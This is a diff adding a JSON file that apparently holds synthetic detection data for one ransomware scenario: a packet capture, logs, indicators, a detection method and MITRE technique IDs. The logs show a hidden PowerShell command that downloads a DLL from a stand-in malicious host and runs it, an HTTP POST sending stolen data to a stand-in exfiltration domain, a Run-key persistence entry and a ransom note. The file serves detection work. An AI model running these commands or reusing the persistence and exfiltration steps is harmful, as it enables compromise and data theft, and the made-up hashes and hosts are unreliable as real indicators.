@@ -1,0 +1,69 @@
+{
+  "examples": [
+    {
+      "scenario": "A ransomware attack targeting an enterprise file server where attackers first exfiltrate sensitive data via encrypted outbound HTTPS connections before encrypting local files and dropping ransom notes.",
+      "technical_data": {
+        "network_packet_capture_excerpt": "Frame 1024: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 0\nEthernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 52:54:00:12:34:56\nInternet Protocol Version 4, Src: 10.10.5.12, Dst: 198.51.100.23\nTransmission Control Protocol, Src Port: 52345, Dst Port: 443, Seq: 1001, Ack: 2001\nHypertext Transfer Protocol\n    POST /api/upload HTTP/1.1\r\n    Host: data-exfil.c2domain.com\r\n    User-Agent: Mozilla/5.0\r\n    Content-Type: application/octet-stream\r\n    Content-Length: 1048576\r\n    \r\n    [Binary data blob - encrypted archive of exfiltrated files]",
+        "http_request_raw": "POST /api/upload HTTP/1.1\r\nHost: data-exfil.c2domain.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\nContent-Length: 1048576\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\r\n\r\n[Encrypted ZIP archive binary data]",
+        "ransom_note_file": "-----BEGIN RANSOM NOTE-----\nYour files have been encrypted.\nTo recover your data, visit: hxxps://darkwebpayment[.]onion/payment\nUse your ID: 7A3F1B2C-D9E8-4F7A-8C59-123456789ABC\nIf you fail to pay within 72 hours, your stolen data will be published online.\n-----END RANSOM NOTE-----",
+        "windows_event_log_rundll32": "Date: 2024-05-12 03:47:21\nSource: Microsoft-Windows-Sysmon\nEventID: 1\nImage: C:\\Windows\\System32\\rundll32.exe\nCommandLine: rundll32.exe C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.dll,EntryPoint\nParentImage: C:\\Windows\\explorer.exe\nUser: DOMAIN\\Admin",
+        "file_system_changes": [
+          "C:\\CompanyData\\Q2_Financials.xlsx.encrypted (new encrypted file)",
+          "C:\\CompanyData\\Q2_Financials.xlsx (original file deleted)",
+          "C:\\Users\\Public\\README_RECOVER_FILES.txt (ransom note)"
+        ],
+        "process_tree": [
+          "explorer.exe (PID: 4321)",
+          "  \u2514\u2500 powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri hxxps://malicious-domain.com/payload.dll -OutFile C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.dll (PID: 5872)",
+          "    \u2514\u2500 rundll32.exe C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.dll,EntryPoint (PID: 5890)"
+        ],
+        "registry_modifications": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - Name: \"SysUpdate\" - Data: \"C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.dll\""
+        ],
+        "dns_logs": [
+          "2024-05-12T03:45:10Z QUERY data-exfil.c2domain.com A",
+          "2024-05-12T03:45:10Z RESPONSE 198.51.100.23"
+        ],
+        "powershell_command_logged": "Invoke-WebRequest -Uri hxxps://malicious-domain.com/payload.dll -OutFile C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.dll",
+        "file_hashes": {
+          "payload.dll": {
+            "MD5": "6a8b3e2f98c743e3f54b5f8c2a1d9b74",
+            "SHA1": "c9d4f0f8b1d3a6e7e8f6d5a4b3c2e1f0d7a8b9c0",
+            "SHA256": "d4c3b2a1e6f7d8c9b0a1c2d3e4f5b6789a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d"
+          }
+        }
+      },
+      "indicators": {
+        "domains": [
+          "data-exfil.c2domain.com",
+          "malicious-domain.com"
+        ],
+        "ip_addresses": [
+          "198.51.100.23"
+        ],
+        "file_hashes": [
+          "6a8b3e2f98c743e3f54b5f8c2a1d9b74",
+          "c9d4f0f8b1d3a6e7e8f6d5a4b3c2e1f0d7a8b9c0",
+          "d4c3b2a1e6f7d8c9b0a1c2d3e4f5b6789a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate"
+        ],
+        "processes": [
+          "rundll32.exe",
+          "powershell.exe"
+        ]
+      },
+      "detection_method": "Network monitoring systems detect unusual large HTTPS POST requests to unknown external domains with anomalous TLS certificates. Endpoint detection identifies suspicious PowerShell execution downloading DLL payloads and rundll32.exe executing unknown DLLs from temp directories. File integrity monitoring triggers alerts on mass encryption of files with .encrypted extensions and creation of ransom note text files. DNS logs reveal queries to suspicious C2 domains. Correlation of these logs and artifacts triggers ransomware data exfiltration and encryption detection workflow.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Web Protocols",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1112 - Modify Registry",
+        "T1560.001 - Archive Collected Data"
+      ]
+    }
+  ]
+}
